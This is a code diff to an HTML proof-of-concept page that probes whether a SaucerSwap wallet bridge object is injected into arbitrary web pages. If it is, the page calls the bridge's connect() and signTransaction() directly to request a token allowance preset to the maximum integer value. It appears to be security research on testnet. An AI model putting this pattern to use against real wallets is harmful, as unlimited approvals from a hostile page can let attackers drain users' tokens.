@@ -4,8 +4,6 @@
 <meta charset="UTF-8" />
 <title>SaucerSwap Allowance Display PoC</title>
 <script src="https://unpkg.com/@hashgraph/sdk@2.53.0/dist/hashgraph-sdk.js"></script>
-<script src="https://unpkg.com/@walletconnect/sign-client@2.11.2/dist/index.umd.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
 <style>
   body { font-family: system-ui, sans-serif; max-width: 640px; margin: 40px auto; padding: 0 16px; }
   button { padding: 10px 16px; margin: 6px 6px 6px 0; cursor: pointer; }
@@ -33,11 +31,11 @@
 <input id="amount" value="9223372036854775807" />
 
 <div>
-  <button id="btnConnect">1. Connect Wallet (WalletConnect)</button>
-  <button id="btnSend" disabled>2. Build & Send Allowance Approval</button>
+  <button id="btnCheck">1. Check for injected wallet bridge</button>
+  <button id="btnConnect" disabled>2. Call saucerswapWallet.connect()</button>
+  <button id="btnSend" disabled>3. Build & Send Allowance Approval</button>
 </div>
 
-<div id="qrcode"></div>
 <pre id="log">Waiting...</pre>
 
 <script>
@@ -48,56 +46,32 @@ function log(...args) {
   console.log(...args);
 }
 
-const PROJECT_ID = 'REPLACE_WITH_YOUR_WALLETCONNECT_PROJECT_ID'; // get one free at cloud.walletconnect.com
-const HEDERA_TESTNET_CHAIN = 'hedera:testnet';
+// Report bridge presence immediately on page load — this itself is evidence
+// for the injection-scope question (does the bridge exist on any page loaded
+// in this WebView, not just saucerswap.finance?).
+window.addEventListener('load', () => {
+  log('Page loaded. window.saucerswapWallet present:', typeof window.saucerswapWallet !== 'undefined');
+  log('window.hashpack present:', typeof window.hashpack !== 'undefined');
+  log('Page origin:', window.location.origin);
+});
 
-let signClient;
-let session;
-
-async function initWalletConnect() {
-  signClient = await window.SignClient.init({
-    projectId: PROJECT_ID,
-    metadata: {
-      name: 'SaucerSwap Allowance Display PoC',
-      description: 'Security research test harness',
-      url: window.location.origin,
-      icons: []
-    }
-  });
-  log('WalletConnect SignClient initialized.');
-}
+document.getElementById('btnCheck').addEventListener('click', () => {
+  if (typeof window.saucerswapWallet === 'undefined') {
+    log('NOT FOUND: window.saucerswapWallet is not injected on this page.');
+    log('This means the bridge is likely scoped to specific domains only.');
+    return;
+  }
+  log('FOUND: window.saucerswapWallet is injected on this page.');
+  log('isSaucerSwap flag:', window.saucerswapWallet.isSaucerSwap);
+  document.getElementById('btnConnect').disabled = false;
+});
 
 document.getElementById('btnConnect').addEventListener('click', async () => {
   try {
-    if (!signClient) await initWalletConnect();
-
-    const { uri, approval } = await signClient.connect({
-      requiredNamespaces: {
-        hedera: {
-          methods: ['hedera_signTransaction', 'hedera_signAndExecuteTransaction'],
-          chains: [HEDERA_TESTNET_CHAIN],
-          events: []
-        }
-      }
-    });
-
-    if (uri) {
-      // Render QR code for scanning with the SaucerSwap mobile app,
-      // and also log the raw wc: URI in case you want to open it directly
-      // (e.g. via adb intent) on a connected test device.
-      QRCode.toCanvas(document.createElement('canvas'), uri, (err, canvas) => {
-        if (!err) {
-          document.getElementById('qrcode').innerHTML = '';
-          document.getElementById('qrcode').appendChild(canvas);
-        }
-      });
-      log('WalletConnect URI (scan or open on device):', uri);
-    }
-
-    session = await approval();
-    log('Session approved:', session.namespaces);
+    log('Calling window.saucerswapWallet.connect() ...');
+    const result = await window.saucerswapWallet.connect();
+    log('Connect result:', result);
     document.getElementById('btnSend').disabled = false;
-    document.getElementById('qrcode').innerHTML = '';
   } catch (err) {
     log('Connect error:', err.message || err);
   }
@@ -145,19 +119,9 @@ document.getElementById('btnSend').addEventListener('click', async () => {
     const txBytes = tx.toBytes();
     const txBase64 = btoa(String.fromCharCode(...txBytes));
 
-    log('Transaction built. Sending hedera_signTransaction request to wallet...');
+    log('Transaction built. Calling window.saucerswapWallet.signTransaction() directly...');
 
-    const result = await signClient.request({
-      topic: session.topic,
-      chainId: HEDERA_TESTNET_CHAIN,
-      request: {
-        method: 'hedera_signTransaction',
-        params: {
-          signerAccountId: `hedera:testnet:${ownerId}`,
-          transactionBody: txBase64
-        }
-      }
-    });
+    const result = await window.saucerswapWallet.signTransaction(txBase64);
 
     log('Wallet responded:', result);
     log('---');
